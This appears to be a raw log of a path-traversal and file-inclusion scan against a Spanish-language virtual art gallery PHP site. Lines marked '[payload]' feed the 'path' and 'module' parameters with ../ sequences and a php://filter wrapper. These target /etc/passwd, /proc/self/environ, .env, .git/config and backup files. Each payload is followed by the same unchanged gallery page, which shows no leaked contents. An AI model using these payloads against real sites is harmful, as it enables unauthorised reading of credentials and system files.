            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] path=../../../../../../../../config.php.bak
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] path=../../../../../../../../backup.zip
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] path=php://filter/read=convert.base64-encode/resource=/etc/passwd
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
-- Testing parameter: module
[payload] module=../../../../../../../..//etc/passwd
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] module=../../../../../../../..//etc/hosts
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] module=../../../../../../../..//proc/self/environ
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] module=../../../../../../../../.env
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] module=../../../../../../../../.git/config
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] module=../../../../../../../../config.php.bak
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .content {
            padding: 40px;
        }
        .menu {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        .menu-item {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }
        .menu-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .menu-item a {
            color: white;
            text-decoration: none;
            font-size: 1.3em;
            font-weight: bold;
            display: block;
        }
        .menu-item p {
            color: rgba(255,255,255,0.9);
            margin-top: 10px;
            font-size: 0.9em;
        }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #667eea;
            margin-top: 20px;
        }
        .info-box h3 {
            color: #667eea;
            margin-bottom: 10px;
        }
        footer {
            background: #2d3748;
            color: white;
            text-align: center;
            padding: 20px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎨 Galería de Arte Virtual</h1>
            <p>Descubre las mejores colecciones de arte digital</p>
        </header>

        <div class="content">
            <div class="menu">
                <div class="menu-item">
                    <a href="gallery.php?page=modern">Arte Moderno</a>
                    <p>Explora obras contemporáneas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=classic">Arte Clásico</a>
                    <p>Colección de pinturas clásicas</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=abstract">Arte Abstracto</a>
                    <p>Formas y colores únicos</p>
                </div>
                <div class="menu-item">
                    <a href="gallery.php?page=about">Acerca de</a>
                    <p>Conoce nuestra galería</p>
                </div>
            </div>

            <div class="info-box">
                <h3>Bienvenido a nuestra galería</h3>
                <p>Explora nuestra colección de arte digital y descubre obras únicas de artistas de todo el mundo. 
                   Navega por las diferentes categorías y sumérgete en el mundo del arte.</p>
            </div>
        </div>

        <footer>
            <p>&copy; 2025 Galería de Arte Virtual | Todos los derechos reservados</p>
        </footer>
    </div>
</body>
</html>
[payload] module=../../../../../../../../backup.zip
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galería de Arte Virtual</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
